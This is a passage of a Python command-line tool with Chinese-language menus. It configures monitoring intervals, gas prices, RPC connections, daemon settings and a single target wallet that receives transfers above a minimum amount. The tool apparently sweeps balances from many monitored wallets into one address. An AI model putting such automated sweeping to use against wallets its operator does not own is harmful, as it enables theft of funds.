                    print(f"\n{Fore.RED}❌ 间隔必须在5-3600秒之间{Style.RESET_ALL}")
            except ValueError:
                print(f"\n{Fore.RED}❌ 输入格式错误{Style.RESET_ALL}")
    
    def _configure_min_transfer(self):
        """配置最小转账金额"""
        print(f"\n{Fore.CYAN}💰 最小转账金额配置{Style.RESET_ALL}")
        print(f"当前金额: {self.min_transfer_amount} ETH")
        
        # 智能推荐
        gas_cost = self.gas_price_gwei * 21000 / 10**9  # 基础转账gas成本
        recommended = max(0.001, gas_cost * 2)  # 至少是gas成本的2倍
        
        print(f"\n{Fore.GREEN}💡 智能推荐: {recommended:.4f} ETH (基于当前Gas价格){Style.RESET_ALL}")
        
        try:
            new_amount = float(self.enhanced_input(
                f"{Fore.CYAN}请输入新的最小转账金额（ETH）: {Style.RESET_ALL}",
                default=str(recommended),
                menu_name='min_transfer'
            ))
            
            if new_amount > 0:
                self.min_transfer_amount = new_amount
                print(f"\n{Fore.GREEN}✅ 最小转账金额已设置为 {new_amount} ETH{Style.RESET_ALL}")
            else:
                print(f"\n{Fore.RED}❌ 金额必须大于0{Style.RESET_ALL}")
        except ValueError:
            print(f"\n{Fore.RED}❌ 输入格式错误{Style.RESET_ALL}")
    
    def _configure_gas_price(self):
        """配置Gas价格"""
        print(f"\n{Fore.CYAN}⛽ Gas价格配置{Style.RESET_ALL}")
        print(f"当前价格: {self.gas_price_gwei} Gwei")
        
        # 获取实时Gas价格推荐
        if hasattr(self, 'web3_connections') and 'ethereum' in self.web3_connections:
            try:
                current_gas = self.web3_connections['ethereum'].eth.gas_price
                current_gwei = int(current_gas / 10**9)
                fast_gas = int(current_gwei * 1.2)
                standard_gas = int(current_gwei * 1.1)
                slow_gas = current_gwei
                
                print(f"\n{Fore.YELLOW}实时Gas价格参考：{Style.RESET_ALL}")
                print(f"  🐌 慢速: {slow_gas} Gwei")
                print(f"  🚗 标准: {standard_gas} Gwei")
                print(f"  🚀 快速: {fast_gas} Gwei")
            except:
                fast_gas = 50
                standard_gas = 30
                slow_gas = 20
                print(f"\n{Fore.YELLOW}推荐Gas价格：{Style.RESET_ALL}")
                print(f"  🐌 慢速: {slow_gas} Gwei")
                print(f"  🚗 标准: {standard_gas} Gwei")
                print(f"  🚀 快速: {fast_gas} Gwei")
        else:
            standard_gas = 30
        
        try:
            new_gas_price = int(self.enhanced_input(
                f"{Fore.CYAN}请输入新的Gas价格（Gwei）: {Style.RESET_ALL}",
                default=str(standard_gas),
                menu_name='gas_price'
            ))
            
            if new_gas_price > 0:
                self.gas_price_gwei = new_gas_price
                print(f"\n{Fore.GREEN}✅ Gas价格已设置为 {new_gas_price} Gwei{Style.RESET_ALL}")
            else:
                print(f"\n{Fore.RED}❌ Gas价格必须大于0{Style.RESET_ALL}")
        except ValueError:
            print(f"\n{Fore.RED}❌ 输入格式错误{Style.RESET_ALL}")
    
    def _configure_target_account(self):
        """配置目标账户"""
        print(f"\n{Fore.CYAN}🎯 目标账户管理{Style.RESET_ALL}")
        print(f"当前目标: {self.target_wallet if self.target_wallet else '未设置'}")
        
        print(f"\n{Fore.YELLOW}操作选项：{Style.RESET_ALL}")
        print(f"  1. 修改目标账户")
        print(f"  2. 清除目标账户")
        print(f"  3. 验证目标账户")
        print(f"  0. 返回")
        
        choice = self.enhanced_input(
            f"\n{Fore.YELLOW}请选择操作: {Style.RESET_ALL}",
            default="0",
            choices=['0', '1', '2', '3'],
            menu_name='target_account'
        )
        
        if choice == '1':
            new_target = self.safe_input(f"{Fore.CYAN}请输入新的目标账户地址: {Style.RESET_ALL}").strip()
            if new_target and len(new_target) == 42 and new_target.startswith('0x'):
                self.target_wallet = new_target.lower()
                print(f"\n{Fore.GREEN}✅ 目标账户已设置为: {new_target}{Style.RESET_ALL}")
            else:
                print(f"\n{Fore.RED}❌ 无效的以太坊地址{Style.RESET_ALL}")
        elif choice == '2':
            self.target_wallet = None
            print(f"\n{Fore.GREEN}✅ 目标账户已清除{Style.RESET_ALL}")
        elif choice == '3':
            if self.target_wallet:
                print(f"\n{Fore.GREEN}✅ 目标账户格式有效: {self.target_wallet}{Style.RESET_ALL}")
            else:
                print(f"\n{Fore.YELLOW}⚠️ 未设置目标账户{Style.RESET_ALL}")
    
    def _configure_network_settings(self):
        """配置网络设置"""
        print(f"\n{Fore.CYAN}🔧 高级网络设置{Style.RESET_ALL}")
        print(f"当前连接: {len(self.web3_connections)} 个网络")
        
        print(f"\n{Fore.YELLOW}网络配置选项：{Style.RESET_ALL}")
        print(f"  1. 重新初始化所有网络连接")
        print(f"  2. 测试网络连接质量")
        print(f"  3. 清理失效连接")
        print(f"  4. 显示网络统计")
        print(f"  0. 返回")
        
        choice = self.enhanced_input(
            f"\n{Fore.YELLOW}请选择操作: {Style.RESET_ALL}",
            default="0",
            choices=['0', '1', '2', '3', '4'],
            menu_name='network_settings'
        )
        
        if choice == '1':
            print(f"\n{Fore.CYAN}🔄 正在重新初始化网络连接...{Style.RESET_ALL}")
            self.init_web3_connections()
            print(f"{Fore.GREEN}✅ 网络连接已重新初始化{Style.RESET_ALL}")
        elif choice == '2':
            print(f"\n{Fore.CYAN}🧪 测试网络连接质量...{Style.RESET_ALL}")
            # 这里可以调用RPC测试功能
            print(f"{Fore.GREEN}✅ 网络测试完成，请查看RPC管理菜单获取详细结果{Style.RESET_ALL}")
        elif choice == '3':
            cleaned = self._clean_invalid_connections()
            print(f"\n{Fore.GREEN}✅ 已清理 {cleaned} 个失效连接{Style.RESET_ALL}")
        elif choice == '4':
            self._show_network_statistics()
    
    def _configure_performance(self):
        """配置性能选项"""
        print(f"\n{Fore.CYAN}📊 性能优化配置{Style.RESET_ALL}")
        
        if hasattr(self, 'throttler'):
            print(f"智能调速: {'启用' if self.throttler_enabled else '禁用'}")
        
        print(f"\n{Fore.YELLOW}性能选项：{Style.RESET_ALL}")
        print(f"  1. 切换智能调速")
        print(f"  2. 清理缓存")
        print(f"  3. 内存优化")
        print(f"  4. 查看性能统计")
        print(f"  0. 返回")
        
        choice = self.enhanced_input(
            f"\n{Fore.YELLOW}请选择操作: {Style.RESET_ALL}",
            default="0",
            choices=['0', '1', '2', '3', '4'],
            menu_name='performance_settings'
        )
        
        if choice == '1':
            self.throttler_enabled = not self.throttler_enabled
            status = "启用" if self.throttler_enabled else "禁用"
            print(f"\n{Fore.GREEN}✅ 智能调速已{status}{Style.RESET_ALL}")
        elif choice == '2':
            if hasattr(self, 'smart_cache'):
                self.smart_cache.invalidate()
                print(f"\n{Fore.GREEN}✅ 缓存已清理{Style.RESET_ALL}")
        elif choice == '3':
            self.cleanup_memory()
            print(f"\n{Fore.GREEN}✅ 内存优化完成{Style.RESET_ALL}")
        elif choice == '4':
            self._show_performance_stats()
    
    def _auto_save_settings(self):
        """自动保存设置"""
        print(f"\n{Fore.CYAN}💾 自动保存当前设置{Style.RESET_ALL}")
        
        try:
            # 保存所有设置到缓存
            settings_data = {
                'monitor_interval': self.monitor_interval,
                'min_transfer_amount': self.min_transfer_amount,
                'gas_price_gwei': self.gas_price_gwei,
                'target_wallet': self.target_wallet,
                'user_preferences': self.user_preferences,
                'throttler_enabled': getattr(self, 'throttler_enabled', True)
            }
            
            self.smart_cache.set('user_settings', settings_data, 'persistent', 'user_preferences')
            print(f"\n{Fore.GREEN}✅ 设置已自动保存{Style.RESET_ALL}")
            
        except Exception as e:
            print(f"\n{Fore.RED}❌ 保存失败: {e}{Style.RESET_ALL}")
    
    def _clean_invalid_connections(self) -> int:
        """清理无效连接"""
        cleaned = 0
        invalid_keys = []
        
        for key, web3_conn in self.web3_connections.items():
            try:
                # 测试连接
                web3_conn.eth.block_number
            except:
                invalid_keys.append(key)
                cleaned += 1
        
        for key in invalid_keys:
            del self.web3_connections[key]
        
        return cleaned
    
    def _show_network_statistics(self):
        """显示网络统计"""
        print(f"\n{Fore.CYAN}📊 网络连接统计{Style.RESET_ALL}")
        print(f"总连接数: {len(self.web3_connections)}")
        
        for network_name, web3_conn in self.web3_connections.items():
            try:
                block_number = web3_conn.eth.block_number
                print(f"  {network_name}: 区块 {block_number} ✅")
            except:
                print(f"  {network_name}: 连接失败 ❌")
    
    def _show_performance_stats(self):
        """显示性能统计"""
        print(f"\n{Fore.CYAN}📊 性能统计报告{Style.RESET_ALL}")
        
        if hasattr(self, 'smart_cache'):
            cache_stats = self.smart_cache.get_stats()
            print(f"缓存项数: {cache_stats['total_size']}")
            
            if cache_stats['hit_rates']:
                avg_hit_rate = sum(cache_stats['hit_rates'].values()) / len(cache_stats['hit_rates'])
                print(f"平均命中率: {avg_hit_rate:.2%}")
        
        if hasattr(self, 'operation_timers'):
            print(f"活跃计时器: {len(self.operation_timers)}")
        
        print(f"钱包数量: {len(self.wallets)}")
        print(f"监控地址: {len(self.monitored_addresses)}")
        print(f"网络连接: {len(self.web3_connections)}")
    
    def _load_user_settings(self):
        """加载用户设置"""
        try:
            settings_data = self.smart_cache.get('user_settings', 'user_preferences')
            if settings_data:
                self.monitor_interval = settings_data.get('monitor_interval', self.monitor_interval)
                self.min_transfer_amount = settings_data.get('min_transfer_amount', self.min_transfer_amount)
                self.gas_price_gwei = settings_data.get('gas_price_gwei', self.gas_price_gwei)
                if settings_data.get('target_wallet'):
                    self.target_wallet = settings_data.get('target_wallet')
                self.user_preferences.update(settings_data.get('user_preferences', {}))
                print(f"{Fore.GREEN}✅ 用户设置已从缓存加载{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.YELLOW}⚠️ 加载用户设置失败: {e}{Style.RESET_ALL}")
    
    def _get_smart_monitor_interval(self) -> int:
        """获取智能监控间隔"""
        # 根据系统状态智能推荐间隔
        network_count = len(self.web3_connections)
        wallet_count = len(self.wallets)
        
        if network_count >= 15 and wallet_count <= 10:
            return 15  # 网络充足，钱包较少，高频监控
        elif network_count >= 10:
            return 30  # 标准监控
        elif network_count >= 5:
            return 60  # 网络较少，降低频率
        else:
            return 120  # 网络很少，低频监控
    
    def _get_smart_gas_price(self) -> int:
        """获取智能Gas价格"""
        try:
            if 'ethereum' in self.web3_connections:
                current_gas = self.web3_connections['ethereum'].eth.gas_price
                # 建议稍高于当前网络Gas价格
                return int(current_gas * 1.1 / 10**9)
            else:
                return 30  # 默认30 Gwei
        except:
            return 30
    
    def _get_smart_min_transfer(self) -> float:
        """获取智能最小转账金额"""
        gas_cost = self.gas_price_gwei * 21000 / 10**9  # 基础转账gas成本
        # 至少是gas成本的3倍，确保有利润
        return max(0.001, gas_cost * 3)
    
    def _get_smart_network_timeout(self) -> int:
        """获取智能网络超时时间"""
        if len(self.web3_connections) > 10:
            return 5  # 网络多时，降低超时时间
        else:
            return 10  # 网络少时，增加超时时间
    
    def apply_smart_defaults(self):
        """应用智能默认值"""
        if not self.user_preferences.get('smart_defaults', True):
            return
        
        print(f"\n{Fore.CYAN}🧠 应用智能默认值...{Style.RESET_ALL}")
        
        # 应用智能监控间隔
        smart_interval = self._get_smart_monitor_interval()
        if abs(self.monitor_interval - smart_interval) > 10:
            print(f"  📊 优化监控间隔: {self.monitor_interval}s → {smart_interval}s")
            self.monitor_interval = smart_interval
        
        # 应用智能Gas价格
        smart_gas = self._get_smart_gas_price()
        if abs(self.gas_price_gwei - smart_gas) > 5:
            print(f"  ⛽ 优化Gas价格: {self.gas_price_gwei} → {smart_gas} Gwei")
            self.gas_price_gwei = smart_gas
        
        # 应用智能最小转账金额
        smart_min = self._get_smart_min_transfer()
        if abs(self.min_transfer_amount - smart_min) > 0.001:
            print(f"  💰 优化最小转账: {self.min_transfer_amount:.4f} → {smart_min:.4f} ETH")
            self.min_transfer_amount = smart_min
        
        print(f"{Fore.GREEN}✅ 智能默认值应用完成{Style.RESET_ALL}")
    
    def auto_suggest_improvements(self):
        """自动建议改进"""
        if not self.automation_configs.get('auto_suggest_improvements', True):
            return
        
        suggestions = []
        
        # 检查监控效率
        if self.monitor_interval < 10 and len(self.wallets) > 50:
            suggestions.append("💡 建议：钱包数量较多时，可适当增加监控间隔以提高效率")
        
        # 检查网络连接
        if len(self.web3_connections) < 5:
            suggestions.append("🔗 建议：增加更多RPC连接以提高监控稳定性")
        
        # 检查Gas价格设置
        current_smart_gas = self._get_smart_gas_price()
        if abs(self.gas_price_gwei - current_smart_gas) > 10:
            suggestions.append(f"⛽ 建议：当前Gas价格({self.gas_price_gwei})偏离推荐值({current_smart_gas})")
        
        # 检查缓存使用
        if hasattr(self, 'smart_cache'):
            cache_stats = self.smart_cache.get_stats()
            if cache_stats['total_size'] == 0:
                suggestions.append("💾 建议：启用智能缓存可以显著提高性能")
        
        return suggestions
    
    def optimize_performance(self):
        """性能自动优化系统"""
        if not self.automation_configs.get('auto_cache_frequently_used_data', True):
            return
        
        print(f"\n{Fore.CYAN}🚀 启动性能优化...{Style.RESET_ALL}")
        
        # 1. 预加载常用数据
        print(f"  📊 预加载常用数据...")
        self.smart_cache.preload(lambda: len(self.wallets), "wallet_count", "menu_data")
        self.smart_cache.preload(lambda: len(self.web3_connections), "connection_count", "menu_data")
        
        # 2. 清理过期缓存
        print(f"  🧹 清理过期缓存...")
        self.smart_cache._cleanup_expired()
        
        # 3. 优化网络连接
        if len(self.web3_connections) > 0:
            print(f"  🔗 优化网络连接...")
            # 移除无效连接
            self._clean_invalid_connections()
        
        # 4. 内存优化
        print(f"  💾 内存优化...")
        self.cleanup_memory()
        
        # 5. 应用智能默认值
        if self.user_preferences.get('smart_defaults', True):
            print(f"  🧠 应用智能配置...")
            self.apply_smart_defaults()
        
        print(f"{Fore.GREEN}✅ 性能优化完成{Style.RESET_ALL}")
    
    def auto_retry_operation(self, operation_func, max_retries: int = 3, delay: float = 1.0, operation_name: str = "操作"):
        """自动重试操作装饰器"""
        if not self.automation_configs.get('auto_retry_failed_operations', True):
            return operation_func()
        
        for attempt in range(max_retries):
            try:
                return operation_func()
            except Exception as e:
                if attempt < max_retries - 1:
                    print(f"{Fore.YELLOW}⚠️ {operation_name}失败，第{attempt + 1}次重试... ({e}){Style.RESET_ALL}")
                    time.sleep(delay * (attempt + 1))  # 递增延迟
                else:
                    print(f"{Fore.RED}❌ {operation_name}最终失败: {e}{Style.RESET_ALL}")
                    raise
        
        return None
    
    def monitor_performance(self):
        """性能监控"""
        performance_data = {
            'timestamp': time.time(),
            'cache_stats': self.smart_cache.get_stats() if hasattr(self, 'smart_cache') else {},
            'wallet_count': len(self.wallets),
            'connection_count': len(self.web3_connections),
            'active_timers': len(self.operation_timers),
            'memory_usage': 0
        }
        
        # 获取内存使用情况（如果有psutil）
        try:
            import psutil
            process = psutil.Process()
            performance_data['memory_usage'] = process.memory_info().rss / 1024 / 1024  # MB
        except:
            pass
        
        # 缓存性能数据
        self.smart_cache.set('performance_data', performance_data, 'memory', 'system_stats')
        
        return performance_data

    def menu_network_management(self):
        """菜单：网络连接管理"""
        print(f"\n{Fore.CYAN}✨ ====== 🌐 网络连接管理 🌐 ====== ✨{Style.RESET_ALL}")
        print(f"{Back.BLUE}{Fore.WHITE} 🔍 检查网络连接状态和RPC健康度... {Style.RESET_ALL}")
        
        # 获取RPC状态数据（使用缓存）
        print(f"\n{Fore.CYAN}📊 获取网络状态数据...{Style.RESET_ALL}")
        rpc_results = self.get_cached_rpc_results()
        
        # 显示所有网络状态
        connected_networks = []
        failed_networks = []
        
        print(f"\n{Fore.YELLOW}📈 网络连接状态：{Style.RESET_ALL}")
        print(f"{Fore.CYAN}─" * 80 + f"{Style.RESET_ALL}")
            
        for network_key, network_info in self.networks.items():
            # 获取RPC健康度信息
            rpc_info = rpc_results.get(network_key, {})
            available_rpcs = rpc_info.get('available_count', 0)
            total_rpcs = rpc_info.get('total_count', len(network_info['rpc_urls']))
            
            if network_key in self.web3_connections:
                connected_networks.append((network_key, network_info))
                status_icon = "🟢"
                status_text = "已连接"
                color = Fore.GREEN
            else:
                failed_networks.append((network_key, network_info))
                status_icon = "🔴"
                status_text = "未连接"
                color = Fore.RED
            
            currency = network_info['native_currency']
            network_name = network_info['name']
            rpc_status = f"({Fore.CYAN}{available_rpcs}/{total_rpcs}{Style.RESET_ALL} RPC可用)"
            
            print(f"  {status_icon} {color}{network_name:<25}{Style.RESET_ALL} ({currency:<5}) - {color}{status_text}{Style.RESET_ALL} {rpc_status}")
        
        print(f"\n{Fore.CYAN}─" * 80 + f"{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}📊 连接统计：{Style.RESET_ALL}")
        print(f"  🟢 {Fore.GREEN}已连接: {len(connected_networks)} 个网络{Style.RESET_ALL}")
        print(f"  🔴 {Fore.RED}未连接: {len(failed_networks)} 个网络{Style.RESET_ALL}")
        
        # 显示RPC健康度统计
        if rpc_results:
            total_rpcs = sum(r['total_count'] for r in rpc_results.values())
            working_rpcs = sum(r['available_count'] for r in rpc_results.values())
            print(f"  📡 {Fore.CYAN}RPC健康度: {working_rpcs}/{total_rpcs} ({working_rpcs/total_rpcs*100:.1f}%){Style.RESET_ALL}")
        
        if failed_networks:
            print(f"\n{Fore.YELLOW}🔄 是否重新连接失败的网络? (y/N): {Style.RESET_ALL}", end="")
            choice = self.safe_input().strip().lower()
            if choice == 'y':
                print(f"\n{Fore.BLUE}🔄 正在重新连接失败的网络...{Style.RESET_ALL}")
                self.init_web3_connections()
                print(f"{Fore.GREEN}✅ 重新连接完成！{Style.RESET_ALL}")
            else:
                print(f"\n{Fore.YELLOW}⚠️  已取消重新连接{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.GREEN}🎉 所有网络都已成功连接！{Style.RESET_ALL}")
        
        self.safe_input(f"\n{Fore.MAGENTA}🔙 按回车键返回主菜单...{Style.RESET_ALL}")
    
    def menu_exit(self):
        """菜单：退出程序"""
        print(f"\n{Fore.CYAN}👋 正在退出...{Style.RESET_ALL}")
        self.stop_monitoring()
        self.save_state()
        # 保存钱包
        self.save_wallets()
        print(f"{Fore.GREEN}✅ 程序已安全退出{Style.RESET_ALL}")

    def menu_daemon_management(self):
        """菜单：守护进程管理"""
        print(f"\n{Fore.CYAN}✨ ====== 🛡️ 守护进程管理 🛡️ ====== ✨{Style.RESET_ALL}")
        print(f"{Back.BLUE}{Fore.WHITE} 🚀 管理程序的守护进程模式和稳定性功能 {Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}📊 当前状态：{Style.RESET_ALL}")
        print(f"  守护进程模式: {'🟢 启用' if self.daemon_mode else '🔴 禁用'}")
        print(f"  错误计数: {Fore.YELLOW}{self.error_count}/{self.max_errors}{Style.RESET_ALL}")
        print(f"  重启计数: {Fore.YELLOW}{self.restart_count}/{self.max_restarts}{Style.RESET_ALL}")
        
        # 显示内存清理状态
        import time
        time_since_cleanup = int(time.time() - self.last_memory_cleanup)
        cleanup_interval = self.memory_cleanup_interval
        print(f"  上次内存清理: {Fore.CYAN}{time_since_cleanup//60}分钟前{Style.RESET_ALL}")
        print(f"  下次内存清理: {Fore.CYAN}{(cleanup_interval - time_since_cleanup)//60}分钟后{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}🔧 管理选项：{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}1.{Style.RESET_ALL} 🧹 立即执行内存清理")
        print(f"  {Fore.GREEN}2.{Style.RESET_ALL} 📊 查看系统状态详情")
        print(f"  {Fore.GREEN}3.{Style.RESET_ALL} ⚙️  调整守护进程参数")
        print(f"  {Fore.GREEN}4.{Style.RESET_ALL} 📜 创建守护进程启动脚本")
        print(f"  {Fore.GREEN}5.{Style.RESET_ALL} 🔄 重置错误计数")
        print(f"  {Fore.RED}0.{Style.RESET_ALL} 🔙 返回主菜单")
        
        choice = self.safe_input(f"\n{Fore.YELLOW}🔢 请选择操作 (0-5): {Style.RESET_ALL}").strip()
        
        try:
            if choice == '1':
                # 立即执行内存清理
                print(f"\n{Fore.CYAN}🧹 正在执行内存清理...{Style.RESET_ALL}")
                self.cleanup_memory()
                print(f"{Fore.GREEN}✅ 内存清理完成！{Style.RESET_ALL}")
                
            elif choice == '2':
                # 查看系统状态详情
                self._show_system_status()
                
            elif choice == '3':
                # 调整守护进程参数
                self._adjust_daemon_params()
                
            elif choice == '4':
                # 创建守护进程启动脚本
                self.create_daemon_wrapper()
                
            elif choice == '5':
                # 重置错误计数
                self.error_count = 0
                self.restart_count = 0
                print(f"{Fore.GREEN}✅ 错误计数和重启计数已重置{Style.RESET_ALL}")
                
            elif choice == '0':
                return
            else:
                print(f"\n{Fore.RED}❌ 无效选择{Style.RESET_ALL}")
                
        except Exception as e:
            print(f"\n{Fore.RED}❌ 操作失败: {e}{Style.RESET_ALL}")
        
        self.safe_input(f"\n{Fore.MAGENTA}🔙 按回车键继续...{Style.RESET_ALL}")
    
    def _show_system_status(self):
        """显示系统状态详情"""
        print(f"\n{Back.CYAN}{Fore.BLACK} 📊 系统状态详情 📊 {Style.RESET_ALL}")
        
        import gc
        
        try:
            import psutil
            psutil_available = True
        except ImportError:
            psutil_available = False
        
        if psutil_available:
            try:
                # 内存使用情况
                process = psutil.Process()
                memory_info = process.memory_info()
                memory_mb = memory_info.rss / 1024 / 1024
                
                print(f"\n{Fore.YELLOW}💾 内存使用：{Style.RESET_ALL}")
                print(f"  当前内存: {Fore.CYAN}{memory_mb:.1f} MB{Style.RESET_ALL}")
                print(f"  虚拟内存: {Fore.CYAN}{memory_info.vms / 1024 / 1024:.1f} MB{Style.RESET_ALL}")
                
                # CPU使用情况
                cpu_percent = process.cpu_percent()
                print(f"\n{Fore.YELLOW}🖥️ CPU使用：{Style.RESET_ALL}")
                print(f"  CPU占用: {Fore.CYAN}{cpu_percent:.1f}%{Style.RESET_ALL}")
                
            except Exception as e:
                print(f"{Fore.RED}❌ 获取系统信息失败: {e}{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}⚠️ 需要安装psutil来查看系统资源信息{Style.RESET_ALL}")
            print(f"  安装命令: pip install psutil")
        
        # 缓存状态
        print(f"\n{Fore.YELLOW}🗃️ 缓存状态：{Style.RESET_ALL}")
        print(f"  RPC测试缓存: {Fore.CYAN}{len(self.rpc_test_cache)}{Style.RESET_ALL} 个网络")
        print(f"  代币元数据缓存: {Fore.CYAN}{len(self.token_metadata_cache)}{Style.RESET_ALL} 个代币")
        print(f"  活跃代币追踪: {Fore.CYAN}{len(self.active_token_tracker)}{Style.RESET_ALL} 个地址")
        print(f"  被拉黑RPC: {Fore.CYAN}{len(self.blocked_rpcs)}{Style.RESET_ALL} 个")
        
        # 连接状态
        print(f"\n{Fore.YELLOW}🌐 网络连接：{Style.RESET_ALL}")
        print(f"  已连接网络: {Fore.CYAN}{len(self.web3_connections)}{Style.RESET_ALL} 个")
        print(f"  监控地址: {Fore.CYAN}{len(self.monitored_addresses)}{Style.RESET_ALL} 个")
        print(f"  钱包数量: {Fore.CYAN}{len(self.wallets)}{Style.RESET_ALL} 个")
        
        # 垃圾回收信息
        gc_stats = gc.get_stats()
        print(f"\n{Fore.YELLOW}🗑️ 垃圾回收：{Style.RESET_ALL}")
        print(f"  GC统计: {Fore.CYAN}{len(gc_stats)}{Style.RESET_ALL} 个世代")
        print(f"  可回收对象: {Fore.CYAN}{len(gc.garbage)}{Style.RESET_ALL} 个")
    
    def _adjust_daemon_params(self):
        """调整守护进程参数"""
        print(f"\n{Back.YELLOW}{Fore.BLACK} ⚙️ 守护进程参数调整 ⚙️ {Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}当前参数：{Style.RESET_ALL}")
        print(f"  1. 最大错误数: {Fore.CYAN}{self.max_errors}{Style.RESET_ALL}")
        print(f"  2. 最大重启次数: {Fore.CYAN}{self.max_restarts}{Style.RESET_ALL}")
        print(f"  3. 重启间隔: {Fore.CYAN}{self.restart_interval//60}分钟{Style.RESET_ALL}")
        print(f"  4. 内存清理间隔: {Fore.CYAN}{self.memory_cleanup_interval//60}分钟{Style.RESET_ALL}")
        
        param_choice = self.safe_input(f"\n{Fore.YELLOW}选择要调整的参数 (1-4, 0取消): {Style.RESET_ALL}").strip()
        
        try:
            if param_choice == '1':
                new_value = int(self.safe_input(f"输入新的最大错误数 (当前: {self.max_errors}): "))
                if 1 <= new_value <= 1000:
                    self.max_errors = new_value
                    print(f"{Fore.GREEN}✅ 最大错误数已设置为: {new_value}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}❌ 值必须在1-1000之间{Style.RESET_ALL}")
                    
            elif param_choice == '2':
                new_value = int(self.safe_input(f"输入新的最大重启次数 (当前: {self.max_restarts}): "))
                if 1 <= new_value <= 100:
                    self.max_restarts = new_value
                    print(f"{Fore.GREEN}✅ 最大重启次数已设置为: {new_value}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}❌ 值必须在1-100之间{Style.RESET_ALL}")
                    
            elif param_choice == '3':
                new_value = int(self.safe_input(f"输入新的重启间隔(分钟) (当前: {self.restart_interval//60}): "))
                if 1 <= new_value <= 1440:  # 最多24小时
                    self.restart_interval = new_value * 60
                    print(f"{Fore.GREEN}✅ 重启间隔已设置为: {new_value}分钟{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}❌ 值必须在1-1440分钟之间{Style.RESET_ALL}")
                    
            elif param_choice == '4':
                new_value = int(self.safe_input(f"输入新的内存清理间隔(分钟) (当前: {self.memory_cleanup_interval//60}): "))
                if 10 <= new_value <= 1440:  # 10分钟到24小时
                    self.memory_cleanup_interval = new_value * 60
                    print(f"{Fore.GREEN}✅ 内存清理间隔已设置为: {new_value}分钟{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}❌ 值必须在10-1440分钟之间{Style.RESET_ALL}")
                    
            elif param_choice == '0':
                return
            else:
                print(f"{Fore.RED}❌ 无效选择{Style.RESET_ALL}")
                
        except ValueError:
            print(f"{Fore.RED}❌ 请输入有效的数字{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}❌ 参数调整失败: {e}{Style.RESET_ALL}")

    def menu_rpc_testing(self):
        """菜单：RPC节点检测"""
        print(f"\n{Fore.CYAN}✨ ====== 🔍 RPC节点检测管理 🔍 ====== ✨{Style.RESET_ALL}")
        print(f"{Back.BLUE}{Fore.WHITE} 📡 检测所有网络的RPC节点连接状态 {Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}🔧 检测选项：{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}1.{Style.RESET_ALL} 🚀 初始化服务器连接（推荐，包含自动屏蔽失效RPC）")
        print(f"  {Fore.MAGENTA}2.{Style.RESET_ALL} 🤖 AI智能ChainList导入（自动匹配+校准+导入RPC）")
        print(f"  {Fore.GREEN}3.{Style.RESET_ALL} 🚫 管理被拉黑的RPC")
        print(f"  {Fore.RED}0.{Style.RESET_ALL} 🔙 返回主菜单")
        
        choice = self.safe_input(f"\n{Fore.YELLOW}🔢 请选择操作 (0-3): {Style.RESET_ALL}").strip()
        
        try:
            if choice == '1':
                # 初始化服务器连接（包含自动屏蔽失效RPC功能）
                print(f"\n{Fore.CYAN}🚀 正在初始化服务器连接并自动屏蔽失效RPC...{Style.RESET_ALL}")
                self.initialize_server_connections()
                
                # 自动屏蔽失效RPC
                print(f"\n{Fore.CYAN}🔄 正在检测所有网络的RPC状态...{Style.RESET_ALL}")
                rpc_results = self.get_cached_rpc_results(force_refresh=True)
                
                disabled_count = self.auto_disable_failed_rpcs()
                print(f"\n{Fore.GREEN}✅ 初始化完成！已自动屏蔽 {disabled_count} 个失效RPC节点{Style.RESET_ALL}")
                
                # 显示检测统计
                print(f"\n{Back.CYAN}{Fore.BLACK} 📊 最终统计 📊 {Style.RESET_ALL}")
                total_networks = len(rpc_results)
                total_rpcs = sum(r['total_count'] for r in rpc_results.values())
                working_rpcs = sum(r['available_count'] for r in rpc_results.values())
                
                print(f"🌐 检测网络: {Fore.CYAN}{total_networks}{Style.RESET_ALL} 个")
                print(f"📡 总RPC数: {Fore.CYAN}{total_rpcs}{Style.RESET_ALL} 个")
                print(f"✅ 可用RPC: {Fore.GREEN}{working_rpcs}{Style.RESET_ALL} 个")
                print(f"❌ 失效RPC: {Fore.RED}{total_rpcs - working_rpcs}{Style.RESET_ALL} 个")
                print(f"📊 总体成功率: {Fore.YELLOW}{working_rpcs/total_rpcs*100:.1f}%{Style.RESET_ALL}")
                
            elif choice == '2':
                # AI智能ChainList导入（融合了校准和导入功能）
                self.ai_smart_chainlist_import()
                
            elif choice == '3':
                # 管理被拉黑的RPC
                self.manage_blocked_rpcs()
                
            elif choice == '0':
                return
            else:
                print(f"\n{Fore.RED}❌ 无效选择{Style.RESET_ALL}")
                
        except Exception as e:
            print(f"\n{Fore.RED}❌ 操作失败: {e}{Style.RESET_ALL}")
        
        self.safe_input(f"\n{Fore.MAGENTA}🔙 按回车键继续...{Style.RESET_ALL}")

    def auto_calibrate_network_chain_ids(self, max_workers: int = 8):
        """自动校准现有网络的chain ID（多线程优化版本）"""
        print(f"\n{Back.BLUE}{Fore.WHITE} 🔧 自动校准网络Chain ID（多线程加速） 🔧 {Style.RESET_ALL}")
        print(f"{Fore.CYAN}检测并校准所有网络的Chain ID...（使用 {max_workers} 个线程并发处理）{Style.RESET_ALL}")
        
        calibration_results = []
        total_networks = len(self.networks)
        calibrated_count = 0
        
        # 准备检测任务
        detection_tasks = []
        for network_key, network_info in self.networks.items():
            detection_tasks.append({
                'network_key': network_key,
                'network_name': network_info['name'],
                'configured_chain_id': network_info['chain_id'],
                'rpc_urls': network_info.get('rpc_urls', [])
            })
        
        def detect_network_chain_id(task):
            """检测单个网络的chain ID"""
            network_key = task['network_key']
            network_name = task['network_name']
            configured_chain_id = task['configured_chain_id']
            rpc_urls = task['rpc_urls']
            
            if not rpc_urls:
                return {
                    'network_key': network_key,
                    'network_name': network_name,
                    'status': 'no_rpc',
                    'configured_id': configured_chain_id,
                    'actual_id': None,
